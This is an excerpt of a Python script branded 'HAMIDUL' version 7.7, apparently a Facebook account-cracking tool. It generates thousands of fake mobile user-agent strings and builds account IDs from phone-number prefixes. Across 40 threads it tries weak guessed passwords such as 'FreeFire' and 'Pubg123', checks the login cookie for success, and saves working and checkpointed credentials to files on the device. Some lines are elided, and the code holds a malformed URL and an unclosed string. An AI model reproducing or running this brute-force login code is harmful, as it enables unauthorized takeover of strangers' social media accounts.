...
for ua in range(10000):
      ...
      aHamidul=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(aHamidul)
for ua in range(5000):
      ...
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      Hamidulb=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(Hamidulb)
for ua in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	...
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	Hamidulc=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(Hamidulc)
for ua in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	...
	h='Mobile Safari/537.36'
	Hamidul=(f"{a} {b}; {xs} {nx} {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(Hamidul)


os.system("xdg-open hhttps://facebook.com/groups/879179499879525/)
logo =("""
\033[1;32m           ▒█░▒█ ░█▀▀█ ▒█▀▄▀█ ▀█▀ ▒█▀▀▄ ▒█░▒█ ▒█░░░ 
\033[1;36m           ▒█▀▀█ ▒█▄▄█ ▒█▒█▒█ ▒█░ ▒█░▒█ ▒█░▒█ ▒█░░░ 
 \033[1;32m          ▒█░▒█ ▒█░▒█ ▒█░░▒█ ▄█▄ ▒█▄▄▀ ░▀▄▄▀ ▒█▄▄█
\033[1;91m╔═════════════════════════╗
\033[1;92m  ᏀᏆҒͲ ᏴƳ HAMIDUL = ᏙᎬᎡՏᏆϴΝ = 7.7
\033[1;91m╚═════════════════════════╝
""") 
...
def Hamiduls():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=40) as Hamidul:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print("\033[1;91m╔═════════════════════════════════════╗")
        ...
        print(f'\033[1;91m║\033[1;92m ᏀᏆҒͲ ᏴƳ HAMIDUL ')
        print("\033[1;91m╚═════════════════════════════════════╝")
        for love in user:
            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','Alh4aj']
            uid = code+love
            Hamidul.submit(Hamidulm,uid,pwx,tl)
    print("\033[1;91m╔═══════════════════════════╗")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/Hamidul-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/Hamidul-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
